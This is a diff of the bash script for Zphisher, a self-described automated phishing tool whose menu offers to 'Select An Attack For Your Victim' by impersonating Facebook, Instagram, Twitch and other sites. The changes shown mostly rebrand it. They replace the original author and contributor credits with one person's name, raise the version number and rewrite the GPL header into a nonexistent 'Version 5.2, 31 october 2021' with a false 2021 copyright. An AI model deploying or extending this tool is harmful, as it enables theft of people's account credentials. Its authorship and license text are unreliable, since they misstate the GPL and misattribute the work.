@@ -1,14 +1,14 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool##   Author 	: 	TAHMID RAYAT 
+##   Zphisher 	: 	Automated Phishing Tool##   Author 	: 	Muzamil Jamil 
 
-##   Version 	: 	2.2
+##   Version 	: 	5.2
 
 ##   Github 	: 	https://github.com/jamil
 
 ##   THANKS TO :
 
-##   Aditya Shakya - https://github.com/adi1090x
+##   Muzamil Jamil - https://github.com/adi1090x
 
 ##   1RaY-1 - https://github.com/1RaY-1
 
@@ -22,17 +22,17 @@
 
 ##   Võ Ngọc Bảo - https://github.com/vongocbao
 
-##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009
+##   Muzamil - https://www.facebook.com/Learn.Termux.009
 
 ## If you Copy Then Give the credits :)
 
 ##                   GNU GENERAL PUBLIC LICENSE
 
-##                    Version 3, 29 June 2007
+##                    Version 5.2, 31 october 2021
 
 ##
 
-##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
+##    Copyright (C) 2021 Free Software Foundation, Inc. <https://fsf.org/>
 
 ##    Everyone is permitted to copy and distribute verbatim copies
 
@@ -276,19 +276,19 @@ banner() {
 
 		${ORANGE} ______      _     _     _               
 
-		${ORANGE}|___  /     | |   (_)   | |              
+		${RED}|___  /     | |   (_)   | |              
 
 		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
 
 		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
 
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
+		${YELLOW} / /__| |_) | | | | \__ \ | | |  __/ |   
 
 		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
 
 		${ORANGE}      | |                                
 
-		${ORANGE}      |_|                ${RED}Version : 2.2
+		${ORANGE}      |_|                ${RED}Version : 5.2
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Muzamil Jamil (Muzamil)${WHITE}
 
@@ -308,7 +308,7 @@ banner_small() {
 
 		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
 
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 2.2
+		${RED}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 5.2
 
 	EOF
 
@@ -1044,7 +1044,7 @@ main_menu() {
 
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
+		${RED}[${GREEN}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
 
